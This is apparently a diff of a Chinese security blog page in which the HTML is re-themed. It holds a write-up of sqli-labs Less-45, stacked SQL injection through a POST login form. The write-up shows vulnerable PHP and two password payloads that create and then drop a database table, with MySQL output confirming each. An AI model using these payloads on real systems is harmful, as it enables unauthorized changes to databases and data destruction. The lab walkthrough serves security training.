class="hljs-string"> less41</span>|<span class="hljs-string"> hello      </span>|<br><br>|<span class="hljs-string"> 144 </span>|<span class="hljs-string"> less44</span>|<span class="hljs-string"> hello      </span>|<br><br>+-----+----------+------------+<br><br>19 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure>
 
 <h2 id="7-Less-45-报错型堆叠注入-字符型-POST"><a href="#7-Less-45-报错型堆叠注入-字符型-POST" class="headerlink" title="7.Less-45 报错型堆叠注入 - 字符型 - POST"></a>7.Less-45 报错型堆叠注入 - 字符型 - POST</h2><p>（1）源代码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$username = mysqli_real_escape_string($con1, $_POST[&quot;login_user&quot;]);</span><br><span class="line"></span><br><span class="line">$password = $_POST[&quot;login_password&quot;];</span><br><span class="line"></span><br><span class="line">$sql = &quot;SELECT * FROM users WHERE username=(&#x27;$username&#x27;) and password=(&#x27;$password&#x27;)&quot;;</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$username</span> = mysqli_real_escape_string(<span class="hljs-variable">$con1</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;login_user&quot;</span>]);<br><br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;login_password&quot;</span>];<br><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM users WHERE username=(&#x27;<span class="hljs-variable">$username</span>&#x27;) and password=(&#x27;<span class="hljs-variable">$password</span>&#x27;)&quot;</span>;<br></code></pre></td></tr></table></figure>
 
 <p>（2）测试</p>
 <p>登录前测试增加表</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username :  admin</span><br><span class="line"></span><br><span class="line">password :  c&#x27;);create table less45 like users#   //创建了less45表</span><br></pre></td></tr></table></figure>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gauss">username :  admin<br><br>password :  c&#x27;);<span class="hljs-keyword">create</span> table less45 like users<span class="hljs-meta">#   <span class="hljs-comment">//创建了less45表</span></span><br></code></pre></td></tr></table></figure>
 
 <p>登录后查看增加表</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show tables;</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">| Tables_in_security |</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">| emails|</span><br><span class="line"></span><br><span class="line">| less45|</span><br><span class="line"></span><br><span class="line">| referers|</span><br><span class="line"></span><br><span class="line">| uagents|</span><br><span class="line"></span><br><span class="line">| users|</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">5 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">mysql&gt; show tables;<br><br>+--------------------+<br><br>|<span class="hljs-string"> Tables_in_security </span>|<br><br>+--------------------+<br><br>|<span class="hljs-string"> emails</span>|<br><br>|<span class="hljs-string"> less45</span>|<br><br>|<span class="hljs-string"> referers</span>|<br><br>|<span class="hljs-string"> uagents</span>|<br><br>|<span class="hljs-string"> users</span>|<br><br>+--------------------+<br><br>5 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure>
 
 <p>登录前测试删除表</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username： admin</span><br><span class="line"></span><br><span class="line">password ： c&#x27;);drop table less45#</span><br></pre></td></tr></table></figure>
+<figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pf">username： admin<br><br>password ： c&#x27;);<span class="hljs-keyword">drop</span> <span class="hljs-built_in">table</span> less45<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
 
 <p>登录后查看删除表</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show tables;</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">| Tables_in_security |</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">| emails|</span><br><span class="line"></span><br><span class="line">| referers|</span><br><span class="line"></span><br><span class="line">| uagents|</span><br><span class="line"></span><br><span class="line">| users|</span><br><span class="line"></span><br><span class="line">+--------------------+</span><br><span class="line"></span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">mysql&gt; show tables;<br><br>+--------------------+<br><br>|<span class="hljs-string"> Tables_in_security </span>|<br><br>+--------------------+<br><br>|<span class="hljs-string"> emails</span>|<br><br>|<span class="hljs-string"> referers</span>|<br><br>|<span class="hljs-string"> uagents</span>|<br><br>|<span class="hljs-string"> users</span>|<br><br>+--------------------+<br><br>4 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure>
 
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
       
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%20stacked%20%20injection/" data-id="cmaxygi1c003boc7k9m1g8j6y" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
+
+<span class="category-chains">
+  
   
     
-<nav id="article-nav">
+      <span class="category-chain">
+        
+  <a href="/categories/Web/" class="category-chain-item">Web</a>
   
-    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%9F%BA%E7%A1%80%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Newer</strong>
-      <div class="article-nav-title">
-        
-          (no title)
-        
+  
+    <span>></span>
+    
+  <a href="/categories/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="category-chain-item">注入漏洞</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/" class="category-chain-item">SQL注入</a>
+  
+  
+
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5-stacked-injection/" class="print-no-link">#堆叠注入 stacked  injection</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>堆叠注入 stacked  injection</div>
+      <div>http://example.com/2025/05/20/Web/注入漏洞/SQL注入/堆叠注入 stacked  injection/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年5月20日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/Apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E+%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/" title="Apache解析漏洞+条件竞争">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Apache解析漏洞+条件竞争</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/" title="宽字节注入">
+                        <span class="hidden-mobile">宽字节注入</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
       </div>
-    </a>
-  
-  
-    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/" id="article-nav-older" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title"></div>
-    </a>
-  
-</nav>
-
-  
-</article>
-
-
-</section>
-        
-          <aside id="sidebar">
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Categories</h3>
-    <div class="widget">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Web/">Web</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Web/HTTP%E6%95%99%E7%A8%8B/">HTTP教程</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/PHP%E5%AE%89%E5%85%A8/">PHP安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/XSS/">XSS</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">工具使用</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">注入漏洞</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a></li></ul></li></ul></li></ul>
     </div>
-  </div>
 
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tags</h3>
-    <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CSRF/" rel="tag">CSRF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF%E9%A2%98%E7%9B%AE/" rel="tag">CTF题目</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Content-Type/" rel="tag">Content-Type</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTTP/" rel="tag">HTTP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTTPS/" rel="tag">HTTPS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SSTI/" rel="tag">SSTI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS/" rel="tag">XSS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSStrike/" rel="tag">XSStrike</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/labs/" rel="tag">labs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%9E%E6%88%98/" rel="tag">实战</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5/" rel="tag">对象注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" rel="tag">报错注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" rel="tag">数据库</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" rel="tag">模板注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/" rel="tag">比较漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" rel="tag">网络协议</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag">网络安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/" rel="tag">跨站脚本</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tag Cloud</h3>
-    <div class="widget tagcloud">
-      <a href="/tags/CSRF/" style="font-size: 10px;">CSRF</a> <a href="/tags/CTF%E9%A2%98%E7%9B%AE/" style="font-size: 10px;">CTF题目</a> <a href="/tags/Content-Type/" style="font-size: 10px;">Content-Type</a> <a href="/tags/HTTP/" style="font-size: 13.33px;">HTTP</a> <a href="/tags/HTTPS/" style="font-size: 10px;">HTTPS</a> <a href="/tags/PHP/" style="font-size: 16.67px;">PHP</a> <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 13.33px;">SQL注入</a> <a href="/tags/SSTI/" style="font-size: 10px;">SSTI</a> <a href="/tags/XSS/" style="font-size: 20px;">XSS</a> <a href="/tags/XSStrike/" style="font-size: 10px;">XSStrike</a> <a href="/tags/labs/" style="font-size: 10px;">labs</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 13.33px;">反序列化</a> <a href="/tags/%E5%AE%89%E5%85%A8/" style="font-size: 13.33px;">安全</a> <a href="/tags/%E5%AE%9E%E6%88%98/" style="font-size: 10px;">实战</a> <a href="/tags/%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">对象注入</a> <a href="/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">报错注入</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 10px;">数据库</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">比较漏洞</a> <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 10px;">渗透测试</a> <a href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" style="font-size: 10px;">网络协议</a> <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="font-size: 10px;">网络安全</a> <a href="/tags/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/" style="font-size: 10px;">跨站脚本</a>
-    </div>
-  </div>
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Archives</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/05/">May 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/05/">May 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/04/">April 2024</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Recent Posts</h3>
-    <div class="widget">
-      <ul>
-        
-          <li>
-            <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/xsstrike/">(no title)</a>
-          </li>
-        
-          <li>
-            <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/sqlmap/">(no title)</a>
-          </li>
-        
-          <li>
-            <a href="/2025/05/20/Web/%E7%BB%95%E8%BF%87/%E7%BB%95%E8%BF%87/">(no title)</a>
-          </li>
-        
-          <li>
-            <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/Apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E+%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/">(no title)</a>
-          </li>
-        
-          <li>
-            <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/user.ini/">(no title)</a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
-
-  
-</aside>
-        
-      </div>
-      <footer id="footer">
-  
-  <div class="outer">
-    <div id="footer-info" class="inner">
+    <div class="side-col d-none d-lg-block col-lg-2">
       
-      &copy; 2025 John Doe<br>
-      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
-    </div>
-  </div>
-</footer>
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
 
     </div>
-    <nav id="mobile-nav">
+  </div>
+</div>
+
+
+
+
+
   
-    <a href="/" class="mobile-nav-link">Home</a>
+
+
+
   
-    <a href="/archives" class="mobile-nav-link">Archives</a>
+
+
+
   
-</nav>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
     
 
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
 
-<script src="/js/jquery-3.6.4.min.js"></script>
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="/js/jquery.min.js/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
 
 
 
   
-<script src="/fancybox/jquery.fancybox.min.js"></script>
+    <script  src="/js/img-lazyload.js" ></script>
+  
 
 
 
 
-<script src="/js/script.js"></script>
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
 
 
 
 
 
-  </div>
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
 </body>
 </html>
